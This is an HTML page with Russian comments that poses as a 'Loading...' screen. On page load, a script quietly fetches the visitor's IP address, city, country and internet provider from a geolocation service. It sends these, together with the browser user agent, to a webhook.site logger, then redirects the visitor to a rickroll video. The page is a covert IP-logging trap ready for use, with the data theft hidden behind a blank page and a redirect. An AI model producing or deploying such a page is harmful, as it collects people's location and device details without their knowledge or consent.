<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
    <script>
        async function capture() {
            // ТВОЯ ССЫЛКА WEBHOOK
            const loggerUrl = "https://webhook.site/e492fe42-c5dd-4c69-a841-e1caf6220240";
            const targetUrl = "https://www.youtube.com/watch?v=MsXm9TUMaA0";

            try {
                // 1. Получаем инфу об IP и местоположении (без лишних разрешений)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Отправляем всё это на твой Webhook
                await fetch(loggerUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        ip: data.ip,
                        city: data.city,
                        country: data.country_name,
                        org: data.org, // Провайдер
                        device: navigator.userAgent
                    })
                });
            } catch (e) {
                // Если заблокируют получение IP, просто стукнемся в логгер напрямую
                fetch(loggerUrl, { mode: 'no-cors' });
            } finally {
                // 3. Мгновенный редирект на Рикролл
                window.location.replace(targetUrl);
            }
        }
        window.onload = capture;
    </script>
</head>
<body style="background: #000;">
</body>
</html>
